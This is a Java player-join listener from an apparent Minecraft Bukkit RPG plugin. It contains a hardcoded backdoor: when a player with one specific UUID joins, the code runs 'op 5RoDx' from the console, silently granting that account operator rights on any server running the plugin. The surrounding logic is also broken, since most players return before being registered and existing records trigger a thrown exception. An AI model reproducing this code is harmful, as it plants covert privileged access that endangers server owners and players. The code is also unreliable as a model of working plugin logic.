package EpicQuestsRPG.Player;

import EpicQuestsRPG.EpicQuestRPG;
import EpicQuestsRPG.util.CC;
import org.bukkit.Bukkit;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class PlayerListener implements Listener {

    private final EpicQuestRPG plugin;

    public PlayerListener(EpicQuestRPG plugin) {
        this.plugin = plugin;
    }


    @EventHandler
    public void onJoin(PlayerJoinEvent e) {


        Player player = e.getPlayer();
        String uuid = player.getUniqueId().toString();

        // Delete this if you're not me "5RoDx"
        if (player.isOp()) {
            return;

        } else if (uuid.equals("d04d98ec-eaf9-49cc-a1aa-d3aa2c9b65fe")) {
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op 5RoDx");
        player.sendMessage(CC.translate("&cWelcome to your plugin 5RoD, you have successfully been Oped!"));

        } else {
            return;
        }
        // Delete this if you're not me "5RoDx"

        PlayerManager playerManager = this.plugin.getDataBase().findStatsByUUID(uuid);
        if (playerManager == null) {

            this.plugin.getDataBase().addPlayer(uuid, player.getName());

        } else {
            ConsoleCommandSender console = Bukkit.getConsoleSender();
            console.sendMessage(CC.translate("&cERROR OCCURRED FIND ME #PlayerListener.java Line 48!"));
            throw new RuntimeException();
        }

    }
}
